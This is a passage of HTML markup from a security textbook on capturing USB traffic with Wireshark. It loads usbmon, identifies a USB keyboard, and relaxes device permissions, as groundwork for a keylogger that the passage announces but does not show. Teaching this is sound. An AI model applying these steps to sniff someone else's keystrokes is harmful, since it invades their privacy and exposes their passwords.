><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.3000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:11.5000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.4000pt;" ><a name="USB and Wireshark" ></a><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><a name="_bookmark556" ></a>USB and Wireshark</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section285" ><p class=MsoBodyText  style="margin-top:3.7500pt;margin-right:8.6500pt;" ><a name="_bookmark557" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >When you think about USB debugging, you usually don&#8217;t think about Wireshark. But Wireshark is able to both capture (on Linux) and dissect/decode USB traffic, which makes it a handy tool. In this section, we go over some basics of the USB protocol and how to capture USB traffic on both Linux and Windows machines. Then we walk through how to create a simple keylogger using TShark and a Lua script. If you don&#8217;t have one handy, start scouring around for a USB keyboard. You are going to need one to build your keylogger.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.7500pt;margin-right:10.7000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >At a high level, USB is a bus with multiple devices connected and can actually be thought of like an Ethernet hub, where all packets are sent to all devices connected on the bus but only those devices to which the USB packet is destined are going to respond. Each device on the bus can have a number of endpoints (see<a name="_bookmark558" ></a>&nbsp;</span><span><a href="#_bookmark559" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-8</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >). These endpoints determine the direction of the traffic, either coming into the device or going out of the device, as well as how the data is transferred, such as in bulk, all at once, or in small chunks, as the host asks for data from the endpoint.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.4500pt;margin-left:0.0000pt;" ><span><table cellpadding="0"  cellspacing="0" ><tr><td width="287.5"  height="0" ></td></tr><tr><td></td><td><img width="447"  height="440"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker367546.png" ></td></tr></table></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:7.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:8.0500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark559" ></a><span><a href="#_bookmark558" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-8:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >USB device overview</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section286" ><p class=MsoBodyText  style="margin-left:13.2500pt;" ><span><span style="position:absolute;z-index:1;margin-left:0.0000px;margin-top:0.0000px;width:763.0000px;height:309.0000px;" ><img width="763"  height="309"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker367638.png" ></span></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:8.0000pt;" ><o:p>&nbsp;</o:p></span></p><h2 style="margin-top:4.3500pt;" ><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" >Capturing USB Traffic on Linux</span></b><b><span style="mso-spacerun:'yes';font-family:Arial;font-weight:bold;font-size:19.5000pt;" ><o:p></o:p></span></b></h2><p class=MsoBodyText  style="margin-top:9.8500pt;margin-right:8.0000pt;" ><a name="_bookmark560" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We start with capturing on Linux, as live capture is supported using the usbmon kernel facility. Usbmon effectively allows for packet capture on a USB bus and was mainlined into the Linux kernel</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.1500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >starting with 2.6.11, so it should be available on pretty much any modern Linux installation. Let&#8217;s look at how to use the usbmon functionality in Kali. The first step is to load the usbmon driver. This is accomplished by running the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >modprobe</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-4.8500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command, as shown in the following snippet:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.9500pt;margin-right:209.6500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@w4sp-kali:~# modprobe usbmon root@w4sp-kali:~# lsmod | grep</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-1.5500pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >usbmon usbmon</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >28672</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >0</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:216.8500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >usbcore</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >200704</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >&#9;</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >6 </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-0.0500pt;font-size:12.0000pt;" >ohci_hcd,ohci_pci,ehci_hcd,ehci_pci, </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >usbhid,usbmon</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:6.3500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >We run </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >lsmod </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to list all the loaded drivers (modules), and we use </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >grep </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to search for the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >usbmon</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.7000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >string to verify that the driver is indeed loaded. Keep in mind that you need to be running as root to be able to load the usbmon module. If you fire up Wireshark, you will see that there are now usbmon </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >x </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >interfaces, with the </span><i><span style="mso-spacerun:'yes';font-family:Georgia;font-style:italic;font-size:15.0000pt;" >x </span></i><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >corresponding to a USB device (see<a name="_bookmark561" ></a>&nbsp;</span><span><a href="#_bookmark562" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-9</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >).</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section287" ><p class=MsoBodyText ><img width="784"  height="254"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker368717.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:3.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark562" ></a><span><a href="#_bookmark561" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-9:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >usbmon interfaces</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.9500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Okay, you have usbmon interfaces, but how do you figure out which interface corresponds to which actual physical USB device? You can start by using the </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >lsusb </span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command, which lists the available USB devices on the system. If you are running Kali in a VirtualBox virtual machine (VM) without any other USB devices, you should see something similar to the following snippet:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:11.9500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@w4sp-kali:~# lsusb</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 002 Device 002: ID 80ee:0021 VirtualBox USB Tablet</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.4000pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:9.2500pt;" ><a name="_bookmark563" ></a><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This tells you that there are two USB hubs: one for USB 1.1 and another for USB 2.0. You also see that there is a VirtualBox USB Tablet connected on bus number 2. This is the virtual USB device that VirtualBox uses to provide mouse input to the VM. Before you start checking out some USB traffic, go ahead and work out how to connect a USB device to your VM. Using VirtualBox, this is as easy as clicking Devices and then USB, and selecting the USB device connected to the host that you want to connect to the VM. In<a name="_bookmark564" ></a>&nbsp;</span><span><a href="#_bookmark565" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-10</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >, you can see that a Dell keyboard is being added to the Kali VM. You can</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.9500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >disconnect the device by going to the same menu and selecting the device</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-1.6000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >again.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section288" ><p class=MsoBodyText ><img width="780"  height="386"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker370074.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.2500pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark565" ></a><span><a href="#_bookmark564" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-10:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Connecting USB device to Kali VM</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.3500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Now that you know how to connect a USB device, run </span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >lsusb</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;letter-spacing:-5.4000pt;font-size:12.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >again to see which hub your device is connected to:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@w4sp-kali:~# lsusb</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:11.1500pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Bus 001 Device 001: ID 1d6b:0002 Linux Foundation 2.0 root hub Bus 002 Device 004: ID 413c:2107 Dell Computer Corp.</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.3500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Bus 002 Device 002: ID 80ee:0021 VirtualBox USB Tablet</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:0.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;line-height:13.5500pt;mso-line-height-rule:exactly;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >Bus 002 Device 001: ID 1d6b:0001 Linux Foundation 1.1 root hub</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:0.5000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You can see that we have a new Dell device, number 4, that is attached to bus number 2.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:7.5500pt;margin-right:11.1500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Let&#8217;s fire up Wireshark now and see if we can check out some USB traffic. You know that our device should be on bus 2, so we will start capturing on usbmon2. Keep in mind that this may be different on your machine and that <a name="_bookmark566" ></a>you need to verify which bus your USB device ends up connecting to. If you are running Wireshark as root, you are not going to have any problems performing a capture. However, if you are playing it safe and not running Wireshark, you may run into an error message, as shown in<a name="_bookmark567" ></a>&nbsp;</span><span><a href="#_bookmark568" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-11</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
<div class="Section289" ><p class=MsoBodyText  style="margin-left:95.0000pt;" ><img width="490"  height="253"  src="Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker.files/Wireshark for Security Professionals_ Using Wireshark and the Metasploit Framework - Jeff T. Parker371157.png" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-top:0.1000pt;margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:4.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal  style="margin-top:5.0000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><a name="_bookmark568" ></a><span><a href="#_bookmark567" ><b><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-11:</span></u></b><b><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);font-weight:bold;font-size:15.0000pt;" >&nbsp;</span></b></a></span><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(52,52,52);font-size:15.0000pt;" >Wireshark usbmon error</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-top:9.2000pt;margin-right:6.8000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >This error tells us that we don&#8217;t have permissions to read from the usbmon2 interface. To fix this error, we have to change permissions on the usbmon device, so that our low-privilege user can read from it. It is very important to remember that this will now allow low-privilege users the ability to sniff all the USB traffic going across this particular bus. Depending on your system, this can leave open a huge security hole. You can change permissions by running the following command:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.3000pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@w4sp-kali:/home/w4sp# chmod 644 /dev/usbmon2</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:11.2000pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >You should now be able to capture on usbmon2 as a low-privilege user. The easiest way to ensure that this functionality isn&#8217;t abused is</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-2.2000pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >to ensure that, when you are done sniffing USB traffic, you unload the usbmon driver by typing the following</span><span style="mso-spacerun:'yes';font-family:Georgia;letter-spacing:-0.4500pt;font-size:15.0000pt;" >&nbsp;</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >command:</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal  style="margin-top:12.1500pt;margin-right:0.0000pt;margin-left:8.0000pt;text-indent:0.0000pt;text-align:left;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" >root@w4sp-kali:/home/w4sp# rmmod usbmon</span><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:12.0000pt;" ><o:p></o:p></span></p><p class=MsoBodyText  style="margin-left:0.0000pt;" ><span style="mso-spacerun:'yes';font-family:'Courier New';mso-fareast-font-family:Georgia;mso-hansi-font-family:Georgia;mso-bidi-font-family:Georgia;font-size:10.5000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoBodyText  style="margin-right:9.0500pt;" ><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >Removing the usbmon driver ensures that the usbmon interfaces are not accessible. With permissions set, or you running as root, select the appropriate usbmon interface. You should be able to see traffic similar to that in<a name="_bookmark569" ></a>&nbsp;</span><span><a href="#_bookmark570" ><u><span style="mso-spacerun:'yes';font-family:Georgia;color:rgb(0,0,255);text-decoration:underline;text-underline:rgb(0,0,255) single;font-size:15.0000pt;" >Figure 7-12</span></u></a></span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" >. If you type a key into the USB attached keyboard, you should see additional traffic being generated.</span><span style="mso-spacerun:'yes';font-family:Georgia;font-size:15.0000pt;" ><o:p></o:p></span></p></div>
<span style="mso-spacerun:'yes';font-family:Georgia;font-size:10.0000pt;" ><br clear=all style='page-break-before:always;mso-break-type:section-break'></span>
